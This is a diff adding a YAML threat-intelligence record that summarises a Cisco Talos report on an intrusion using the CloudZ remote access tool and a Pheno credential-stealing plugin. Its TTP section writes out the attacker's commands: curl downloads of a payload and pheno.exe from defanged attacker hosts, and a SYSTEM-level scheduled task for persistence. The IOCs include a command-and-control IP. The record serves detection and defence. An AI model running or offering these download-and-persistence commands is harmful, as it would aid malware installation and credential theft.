@@ -1,0 +1,56 @@
+title: Cisco Talos discovered an intrusion with CloudZ RAT and Pheno plugin
+description: An unknown attacker implanted a CloudZ remote access tool (RAT) and a
+  previously undocumented plugin called Pheno to steal victims' credentials and potentially
+  one-time passwords (OTPs).
+attribution: ''
+malware_families:
+- CloudZ
+cves: []
+ttps:
+  processes:
+  - regasm.exe
+  - powershell.exe
+  - curl.exe
+  command_lines:
+  - Get-CimInstance Win32_Process | Where-Object { $_.Name -ieq 'regasm.exe' -and
+    $_.CommandLine -match 'update\.txt' }
+  - schtasks /create /tn "\Microsoft\Windows\SystemWindowsApi" /tr "C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
+    update.txt /nologo" /sc onstart /ru SYSTEM /rl HIGHEST /f
+  - schtasks /run /tn "\Microsoft\Windows\SystemWindowsApi"
+  - curl -L -o C:\ProgramData\Microsoft\WindowsDoc\update[.]txt hxxps://calm-wildflower-1349[.]hellohiall[.]workers[.]dev
+  - curl -L -o C:\Windows\TEMP\pheno.exe hxxps://orange-cell-1353[.]hellohiall[.]workers[.]dev/pheno.exe
+  powershell:
+  - Invoke-WebRequest
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - curl -> calm-wildflower-1349[.]hellohiall[.]workers[.]dev:80
+  - curl -> orange-cell-1353[.]hellohiall[.]workers[.]dev:80
+  - hxxps://round-cherry-4418[.]hellohiall[.]workers[.]dev/?t=1773406370 -> 185[.]196[.]10[.]136:8089
+  - https://pastebin[.]com/raw/8pYAgF0Z?t=1771833517 -> 185[.]196[.]10[.]136:8089
+  file_activity:
+  - C:\ProgramData\Microsoft\WindowsDoc\update.txt
+  - C:\Windows\TEMP\pheno.exe
+  persistence:
+  - Scheduled task named SystemWindowsApi in the folder \Microsoft\Windows\
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 185[.]196[.]10[.]136
+  domains:
+  - calm-wildflower-1349[.]hellohiall[.]workers[.]dev
+  - orange-cell-1353[.]hellohiall[.]workers[.]dev
+  - round-cherry-4418[.]hellohiall[.]workers[.]dev
+  urls:
+  - hxxps://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-4f181cb2-c6a4-4778-bea0-3f9aba4f0171-1.png
+  - hxxps://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-7b576885-e278-4995-b620-cfcd70ddc7b6-1.png
+  - hxxps://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-175f3759-73a7-4a14-a04e-e6a9e89681bd-1.png
+  - hxxps://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-26486023-9bb2-4eec-abc6-a6f50e4f9049.png
+authors:
+- Alex Karkins
+- Chetan Raghuprasad
+reference: https://blog.talosintelligence.com/cloudz-pheno-infostealer/
+date_of_publication: May 05, 2026
+file_creation_date: May 09, 2026
